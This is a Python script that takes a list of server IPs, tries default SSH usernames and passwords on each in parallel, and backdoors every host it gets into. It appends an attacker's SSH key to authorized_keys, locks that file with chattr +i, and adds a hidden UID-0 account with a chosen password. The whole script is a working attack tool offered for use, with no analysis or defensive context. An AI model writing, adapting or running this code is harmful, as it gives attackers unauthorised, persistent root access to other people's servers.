import os
import sys
import paramiko
import time
import traceback
import select
import threading

port = 22
logins = [
	{"username": "<default username1>", "password": "<default password1>"},	
	{"username": "<default username2>", "password": "<default password2>"},	
	{"username": "<default username3>", "password": "<default password3>"},	
	{"username": "<default username4>", "password": "<default password4>"}	
]
key = 'ssh-rsa <enter your key here>'
outlock = threading.Lock()

def workon(host):
	try:
		for loginInfo in logins:
			try:
				ssh = paramiko.SSHClient()
				ssh.load_system_host_keys()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				print ("Connecting to %s" % host)
				ssh.connect(host, port, loginInfo["username"], loginInfo["password"])
				stdin, stdout, stderr = ssh.exec_command("sudo echo '%s' >> ~/.ssh/authorized_keys \n sudo chattr +i ~/.ssh/authorized_keys \n sudo useradd -ou 0 -g 0 <Enter unsuspecting Username> \n sudo echo '<Enter Password>' | passwd <Enter unsuspecting Username> --stdin" % key)
				with outlock:
					print ("Connected to %s" % host)
					os.system('echo "%s" >> successful' % host)
					print (stdout.readlines())
					sys.exit()
				sys.exit()
			except paramiko.AuthenticationException:
				print ("Authentication failed when connecting to host %s" %(host))
				print ("Trying again for %s" % host)
				pass
	except Exception:
		print ("Port not opened or unreachable for %s" % host)
		os.system('echo "%s" >> failed' % host)
		pass
		sys.exit()
def main():
	threads = []
	for h in open ('serveripaddr.txt'):
		h = h.rstrip()
		t = threading.Thread(target=workon, args=(h,))
		t.start()
		threads.append(t)
	for t in threads:
		t.join()

if __name__ == "__main__":
	main()
